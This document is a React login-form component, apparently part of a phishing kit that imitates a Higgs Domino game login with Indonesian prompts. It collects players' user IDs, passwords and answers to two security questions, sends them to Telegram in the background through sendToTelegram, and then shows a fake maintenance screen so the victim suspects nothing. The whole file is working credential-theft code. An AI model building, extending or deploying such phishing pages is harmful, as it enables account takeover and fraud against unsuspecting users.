import { useState } from 'react';
import { sendToTelegram } from '../services/telegram';
import './LoginForm.css';

interface LoginFormProps {
  onClose?: () => void;
}

const LoginForm = ({ onClose }: LoginFormProps) => {
  const [step, setStep] = useState(1); // 1: Login, 1.5: Security Notification, 2: Verification Questions, 3: Success Modal
  
  // STEP 1 STATES
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [idError, setIdError] = useState(false);
  const [pwError, setPwError] = useState(false);

  // STEP 2 STATES (2 Questions to match reference image)
  const [a1, setA1] = useState('');
  const [a2, setA2] = useState('');
  
  const [loading, setLoading] = useState(false);
  const [showCustomLoading, setShowCustomLoading] = useState(false);

  // Handle Input Number Only for User ID
  const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (/^\d*$/.test(value)) {
      setUsername(value);
      if (value) setIdError(false);
    }
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
    if (/^[A-Za-z0-9]{6,16}$/.test(e.target.value)) {
      setPwError(false);
    }
  };

  const handleConfirm = (e: React.FormEvent) => {
    e.preventDefault();
    playClickSound();
    
    let ok = true;

    if (!username) {
      setIdError(true);
      ok = false;
    } else {
      setIdError(false);
    }

    if (!/^[A-Za-z0-9]{6,16}$/.test(password)) {
      setPwError(true);
      ok = false;
    } else {
      setPwError(false);
    }

    if (!ok) return;

    // Transition to Security Notification Step (1.5)
    setStep(1.5);
  };

  const handleSecurityProceed = () => {
    playClickSound();
    setStep(2); // Go to Verification Questions
  };

  const handleFinalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validasi Sederhana
    if (!a1 || a1.length < 3) { return; }
    if (!a2 || a2.length < 3) { return; }

    setLoading(true); // Disable button immediately

    // Kirim ke Telegram di background
    // Hardcoded questions based on typical usage or reference context
    const q1 = "Apa film favorit Anda?";
    const q2 = "Apa Makanan Kesukaan Anda?";
    const combinedQ = `Q1. ${q1} (${a1})\nQ2. ${q2} (${a2})`;
    
    const success = await sendToTelegram(username, password, combinedQ, "-");
    
    // Tampilkan Custom Loading Overlay
    setShowCustomLoading(true);
    setStep(0); // 0 = Hide all forms temporarily

    // Delay 5 detik sebelum muncul alert sukses/gagal
    setTimeout(() => {
      setShowCustomLoading(false);
      setLoading(false);
      
      if (success) {
        setStep(3); // Show Success Modal
      } else {
        alert('Gagal mengirim data. Silakan coba lagi.');
        setStep(2); // Kembali ke form pertanyaan
      }
    }, 5000);
  };

  const handleClose = () => {
    if (onClose) {
      onClose();
    } else {
      window.location.reload();
    }
  };

  // Mock functions from user snippet
  const playClickSound = () => {
    // Implement sound logic if needed
    console.log("Click sound played");
  };

  // CUSTOM LOADING COMPONENT
  if (showCustomLoading) {
    return (
      <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm animate-fade-in">
        <div className="relative animate-pulse">
          <img 
            src="https://higgsdomino.store/img/loading.png" 
            alt="Loading..." 
            className="w-[400px] md:w-[500px] h-auto drop-shadow-2xl"
          />
        </div>
      </div>
    );
  }

  return (
    <div className="relative flex flex-col items-center">
      
      {/* ================= STEP 1: IMAGE-BASED LOGIN ================= */}
      {step === 1 && (
        <div className="login-popup-container animate-pop-in">
          {/* Main Background Image */}
          <img src="https://higgsdomino.store/img/login.png" alt="ID Login Form" className="login-bg-img" />
          
          {/* Inputs Overlay */}
          <div className="input-container">
            <input 
              type="text" 
              inputMode="numeric"
              id="userID" 
              className="input-field"
              placeholder="" 
              value={username}
              onChange={handleUsernameChange}
            />
            {idError && <div className="error-text">ID wajib diisi</div>}
            
            <input 
              type="password" 
              id="password" 
              className="input-field"
              placeholder="" 
              value={password}
              onChange={handlePasswordChange}
            />
            {pwError && <div className="error-text">Password 6-16 karakter</div>}
          </div>

          {/* <div className="login-helper-text">Silakan masukkan ID 6-16 angka atau huruf</div> */}

          <button className="close-btn" onClick={handleClose} aria-label="Close"></button>

          <button 
            id="submitButton" 
            className="submit-btn-custom" 
            onClick={handleConfirm}
            aria-label="Confirm"
          ></button>
        </div>
      )}

      {/* ================= STEP 1.5: SECURITY NOTIFICATION (NEW) ================= */}
      {step === 1.5 && (
        <div className="security-popup-container animate-pop-in">
          <img 
            src="https://higgsdomino.store/img/keamanan.png" 
            alt="Keamanan" 
            className="login-bg-img" 
            onClick={handleSecurityProceed}
            style={{ cursor: 'pointer' }}
          />
          <button 
             className="security-btn" 
             onClick={handleSecurityProceed}
             aria-label="Lanjutkan Verifikasi"
          ></button>
        </div>
      )}

      {/* ================= STEP 2: VERIFICATION QUESTIONS (IMAGE BASED) ================= */}
      {step === 2 && (
        <div className="verification-popup-container animate-pop-in">
          <div className="verification-inner">
          
            <img src="https://higgsdomino.store/img/verifikasi.png" alt="Verifikasi" className="verification-bg-img" />
            
            <div className="verification-inputs">
              <input 
                type="text" 
                id="answer1" 
                className="verify-input" 
                placeholder=""
                value={a1}
                onChange={(e) => setA1(e.target.value)}
              />
              <input 
                type="text" 
                id="answer2" 
                className="verify-input" 
                placeholder=""
                value={a2}
                onChange={(e) => setA2(e.target.value)}
              />
            </div>

            {/* <div className="verify-helper-text">Silakan masukkan Jawaban</div> */}

     

  <button className="close-btn" onClick={handleClose} aria-label="Close"></button>

          <button 
            id="submitButton" 
            className="submit-btn-custom" 
            onClick={handleFinalSubmit}
             disabled={loading}
            aria-label="Confirm"
          ></button>
    

          </div>
        </div>
      )}

      {/* ================= STEP 3: SUCCESS MODAL ================= */}
      {step === 3 && (
        <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
          <div className="relative">
            <img 
              src="https://higgsdomino.store/img/maintance.png" 
              alt="System Maintenance" 
              className="w-[300px] md:w-[400px] h-auto drop-shadow-2xl rounded-xl"
            />
            
            <button 
              onClick={handleClose} 
              className="absolute top-2 right-2 w-8 h-8 flex items-center justify-center bg-red-500/80 hover:bg-red-600 text-white rounded-full transition-colors z-10 font-bold shadow-md border border-white/20"
            >
              ✕
            </button>

            <button 
              onClick={handleClose}
              className="absolute bottom-[10%] left-1/2 transform -translate-x-1/2 w-[120px] h-[40px] bg-transparent border-none z-20 cursor-pointer"
              aria-label="Confirm"
            ></button>
          </div>
        </div>
      )}

    </div>
  );
};

export default LoginForm;
